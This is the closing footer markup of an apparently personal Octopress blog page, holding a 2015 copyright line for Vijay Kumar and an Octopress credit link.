  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Vijay Kumar -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  











</body>
</html>
